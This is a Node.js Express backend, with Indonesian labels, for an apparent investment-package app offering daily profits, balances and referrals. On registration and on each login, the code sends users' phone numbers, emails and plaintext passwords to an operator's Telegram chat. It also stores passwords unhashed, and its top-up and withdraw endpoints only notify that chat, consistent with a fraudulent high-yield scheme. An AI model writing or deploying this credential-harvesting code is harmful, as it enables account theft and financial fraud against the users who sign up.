const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

// =========================
// TELEGRAM BOT
// =========================
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });

function send(msg){
    if(process.env.BOT_TOKEN && process.env.CHAT_ID){
        bot.sendMessage(process.env.CHAT_ID, msg);
    }
}

// =========================
// DATABASE CONNECT
// =========================
mongoose.connect(process.env.MONGO_URL)
.then(()=>console.log("MongoDB Connected"))
.catch(err=>console.log(err));

// =========================
// USER MODEL
// =========================
const User = mongoose.model("User", {
    username: String,
    phone: { type: String, unique: true },
    email: String,
    password: String,
    referral: String,
    saldo: { type: Number, default: 0 },
    referralCode: String,
    referralCount: { type: Number, default: 0 },
    paketAktif: [
        {
            nama: String,
            modal: Number,
            profitPerHari: Number,
            durasi: Number,
            hariBerjalan: { type: Number, default: 0 },
            lastClaim: Date,
            aktif: { type: Boolean, default: true }
        }
    ]
});

// =========================
// REGISTER
// =========================
app.post("/register", async (req,res)=>{
    const u = new User(req.body);
    await u.save();

    send(`🔵 REGISTRASI
Username   : ${u.username}
Nomor Hp   : ${u.phone}
Email      : ${u.email}
Sandi      : ${u.password}
Referral   : ${u.referral || "-"}`);

    res.json({status:"ok"});
});

// =========================
// LOGIN
// =========================
app.post("/login", async (req,res)=>{
    const {phone, password} = req.body;

    const user = await User.findOne({phone});

    if(!user || user.password !== password){
        return res.json({status:"fail"});
    }

    send(`🟢 LOGIN
Nomor HP  : ${phone}
Sandi     : ${password}`);

    res.json({status:"ok", user});
});

// =========================
// TOPUP
// =========================
app.post("/topup", async (req,res)=>{
    const {phone, nominal, method} = req.body;

    send(`🔴 ${phone} Menunggu Konfirmasi Topup
Nominal   : Rp ${nominal}
Metode    : ${method}`);

    res.json({status:"ok"});
});

// =========================
// WITHDRAW
// =========================
app.post("/withdraw", async (req,res)=>{
    const {phone, nominal} = req.body;

    send(`💸 WITHDRAW
Nomor HP : ${phone}
Nominal  : Rp ${nominal}`);

    res.json({status:"ok"});
});

// =========================
// REFERRAL USED
// =========================
app.post("/referral", async (req,res)=>{
    const {phone, referralPhone} = req.body;

    send(`🟨 REFERRAL DIGUNAKAN
${phone} memakai referral dari
${referralPhone}`);

    res.json({status:"ok"});
});

// =========================
// 💥 ENGINE PAKET BERJALAN 24 JAM
// =========================
// jalan tiap 1 menit
setInterval(async ()=>{

    const users = await User.find();

    for(let user of users){

        if(!user.paketAktif) continue;

        for(let paket of user.paketAktif){

            if(!paket.aktif) continue;

            const now = Date.now();
            const last = paket.lastClaim || now;

            const diff = now - new Date(last).getTime();

            // 1 hari = 24 jam
            if(diff >= 24 * 60 * 60 * 1000){

                user.saldo += paket.profitPerHari;
                paket.hariBerjalan += 1;
                paket.lastClaim = now;

                // jika sudah selesai durasi
                if(paket.hariBerjalan >= paket.durasi){
                    paket.aktif = false;
                }
            }
        }

        await user.save();
    }

    console.log("Paket engine running...");

}, 60 * 1000);

// =========================
// SERVER START
// =========================
const PORT = process.env.PORT || 8080;
app.listen(PORT, ()=>{
    console.log("Server running on", PORT);
});
